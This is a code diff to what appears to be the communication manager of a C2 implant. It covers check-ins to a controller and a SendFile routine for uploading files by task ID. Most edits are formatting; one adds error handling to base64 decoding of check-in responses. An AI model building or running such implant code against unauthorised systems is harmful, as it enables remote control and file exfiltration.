@@ -21,7 +21,7 @@
 // Default constructor
 CommManager::CommManager()
 {
-    const std::vector<std::wstring> hosts = { COMM_HOSTS_LIST };
+    const std::vector<std::wstring> hosts = {COMM_HOSTS_LIST};
 
     payloadUUID = COMM_PAYLOAD_UUID;
     host = L"localhost";
@@ -29,7 +29,7 @@ CommManager::CommManager()
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Initial checkin
-void CommManager::IntialCheckin(const std::string& json)
+void CommManager::IntialCheckin(const std::string &json)
 {
     HINTERNET hSession = NULL;
     HINTERNET hConnect = NULL;
@@ -158,7 +158,7 @@ e_func:
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Full-established checkin
-std::string CommManager::Checkin(const std::string& json)
+std::string CommManager::Checkin(const std::string &json)
 {
     HINTERNET hSession = NULL;
     HINTERNET hConnect = NULL;
@@ -269,8 +269,17 @@ std::string CommManager::Checkin(const std::string& json)
         if (buffer.empty())
             goto e_func;
 
-        result = base64::from_base64(
-            std::string(buffer.begin(), buffer.end()));
+        const std::string encodedResponse(buffer.begin(), buffer.end());
+        try
+        {
+            result = base64::from_base64(encodedResponse);
+        }
+        catch (const std::exception &exception)
+        {
+            std::cerr << "[x] Failed to decode check-in response: "
+                      << exception.what() << "\n";
+            result.clear();
+        }
     }
 
 e_func:
@@ -289,13 +298,13 @@ e_func:
     return result;
 }
 
-bool CommManager::SendFile(const std::string& filePath, int taskId)
+bool CommManager::SendFile(const std::string &filePath, int taskId)
 {
     static std::atomic_uint64_t transferCounter{0};
     const auto timestamp = std::chrono::steady_clock::now().time_since_epoch().count();
     const std::string transferId = callbackUUID + "-" +
-        std::to_string(timestamp) + "-" +
-        std::to_string(transferCounter.fetch_add(1));
+                                   std::to_string(timestamp) + "-" +
+                                   std::to_string(transferCounter.fetch_add(1));
     return FileTransfer::SendFile(
         filePath,
         callbackUUID,
